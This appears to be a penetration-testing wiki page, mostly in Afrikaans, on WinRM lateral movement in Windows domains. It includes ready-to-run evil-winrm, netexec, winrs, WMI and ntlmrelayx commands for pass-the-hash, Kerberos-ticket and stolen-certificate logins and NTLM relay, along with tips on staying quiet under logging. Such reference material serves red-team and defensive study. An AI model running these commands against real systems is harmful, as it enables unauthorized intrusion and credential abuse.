# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM is een van die gerieflikste **lateral movement**-transports in Windows-omgewings omdat dit jou 'n remote shell oor **WS-Man/HTTP(S)** gee sonder dat SMB service creation-truuks nodig is. As die teiken **5985/5986** blootstel en jou principal toegelaat word om remoting te gebruik, kan jy dikwels baie vinnig van "valid creds" na "interactive shell" beweeg.

Vir die **protocol/service enumeration**, listeners, enabling WinRM, `Invoke-Command`, en generiese client usage, kyk:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Uses **HTTP/HTTPS** instead of SMB/RPC, so it often works where PsExec-style execution is blocked.
- With **Kerberos**, it avoids sending reusable credentials to the target.
- Works cleanly from **Windows**, **Linux**, and **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- The interactive PowerShell remoting path spawns **`wsmprovhost.exe`** on the target under the authenticated user context, which is operationally different from service-based exec.

## Access model and prerequisites

In practice, successful WinRM lateral movement depends on **three** things:

1. The target has a **WinRM listener** (`5985`/`5986`) and firewall rules that allow access.
2. The account can **authenticate** to the endpoint.
3. The account is allowed to **open a remoting session**.

Common ways to gain that access:

- **Local Administrator** on the target.
- Membership in **Remote Management Users** on newer systems or **WinRMRemoteWMIUsers__** on systems/components that still honor that group.
- Explicit remoting rights delegated through local security descriptors / PowerShell remoting ACL changes.

If you already control a box with admin rights, remember you can also **delegate WinRM access without full admin group membership** using the techniques described here:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. If you connect by IP, the client usually falls back to **NTLM/Negotiate**.
- In **workgroup** or cross-trust edge cases, NTLM commonly requires either **HTTPS** or the target to be added to **TrustedHosts** on the client.
- With **local accounts** over Negotiate in a workgroup, UAC remote restrictions may prevent access unless the built-in Administrator account is used or `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting defaults to the **`HTTP/<host>` SPN**. In environments where `HTTP/<host>` is already registered to some other service account, WinRM Kerberos may fail with `0x80090322`; use a port-qualified SPN or switch to **`WSMAN/<host>`** where that SPN exists.

If you land valid credentials during password spraying, validating them over WinRM is often the fastest way to check whether they translate into a shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM vir interaktiewe shells

`evil-winrm` bly die gerieflikste interaktiewe opsie vanaf Linux omdat dit **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, en in-memory PowerShell/.NET loading ondersteun.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Wanneer die verstek **`HTTP/<host>`** SPN Kerberos-foute veroorsaak, probeer om eerder 'n **`WSMAN/<host>`**-ticket aan te vra/gebruik. Dit kom voor in geharde of vreemde enterprise-opstellings waar **`HTTP/<host>`** reeds aan 'n ander diensrekening gekoppel is.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Dit is ook nuttig na **RBCD / S4U** misuse wanneer jy spesifiek ’n **WSMAN** dienskaartjie gesmee of aangevra het eerder as ’n generiese `HTTP` kaartjie.

### Sertifikaatgebaseerde verifikasie

WinRM ondersteun ook **kliënt-sertifikaatverifikasie**, maar die sertifikaat moet op die teiken na ’n **plaaslike rekening** gekarteer wees. Vanuit ’n aanvallende perspektief maak dit saak wanneer:

- jy reeds ’n geldige kliënt-sertifikaat en private key gesteel/geëksporteer het wat vir WinRM gekarteer is;
- jy **AD CS / Pass-the-Certificate** misbruik het om ’n sertifikaat vir ’n principal te verkry en dan na ’n ander verifikasiepad te pivot;
- jy werk in omgewings wat doelbewus wagwoordgebaseerde remoting vermy.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-sertifikaat WinRM is baie minder algemeen as password/hash/Kerberos auth, maar wanneer dit bestaan, kan dit ’n **passwordless lateral movement**-pad bied wat password rotation oorleef.

### Python / automation met `pypsrp`

As jy automation nodig het eerder as ’n operator shell, gee `pypsrp` jou WinRM/PSRP vanaf Python met **NTLM**, **certificate auth**, **Kerberos**, en **CredSSP** ondersteuning.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM laterale beweging

### `winrs.exe`

`winrs.exe` is ingebou en nuttig wanneer jy **native WinRM command execution** wil hê sonder om ’n interaktiewe PowerShell remoting-sessie oop te maak:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operasioneel lei `winrs.exe` algemeen tot ’n afgeleë prosesketting soortgelyk aan:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Dit is die moeite werd om te onthou, want dit verskil van service-based exec en van interaktiewe PSRP-sessies.

### `winrm.cmd` / WS-Man COM in plaas van PowerShell remoting

Jy kan ook via **WinRM transport** uitvoer sonder `Enter-PSSession` deur WMI-klasse oor WS-Man aan te roep. Dit hou die transport as WinRM, terwyl die remote execution primitive **WMI `Win32_Process.Create`** word:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Daardie benadering is nuttig wanneer:

- PowerShell logging sterk gemonitor word.
- Jy **WinRM transport** wil hê, maar nie ’n klassieke PS remoting-workflow nie.
- Jy pasgemaakte tooling bou of gebruik rondom die **`WSMan.Automation`** COM object.

## NTLM relay na WinRM (WS-Man)

Wanneer SMB relay deur signing geblokkeer word en LDAP relay beperk is, kan **WS-Man/WinRM** steeds ’n aantreklike relay-teiken wees. Moderne `ntlmrelayx.py` sluit **WinRM relay servers** in en kan na **`wsman://`** of **`winrms://`** targets relay.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Twee praktiese notas:

- Relay is die nuttigste wanneer die teiken **NTLM** aanvaar en die gerelaaide principal toegelaat word om WinRM te gebruik.
- Onlangse Impacket-kode hanteer spesifiek **`WSMANIDENTIFY: unauthenticated`** requests sodat **`Test-WSMan`**-styl probes nie die relay flow breek nie.

Vir multi-hop-beperkings nadat jy ’n eerste WinRM-sessie geland het, kyk:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC en detection notas

- **Interactive PowerShell remoting** skep gewoonlik **`wsmprovhost.exe`** op die teiken.
- **`winrs.exe`** skep gewoonlik **`winrshost.exe`** en dan die aangevraagde child process.
- Verwag **network logon** telemetry, WinRM service events, en PowerShell operational/script-block logging as jy PSRP gebruik eerder as rou **`cmd.exe`**.
- As jy net ’n enkele command nodig het, kan **`winrs.exe`** of eenmalige WinRM execution stiller wees as ’n langlewendige interactive remoting session.
- As Kerberos beskikbaar is, verkies **FQDN + Kerberos** bo IP + NTLM om beide trust issues en ongemaklike client-side **`TrustedHosts`**-veranderings te verminder.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
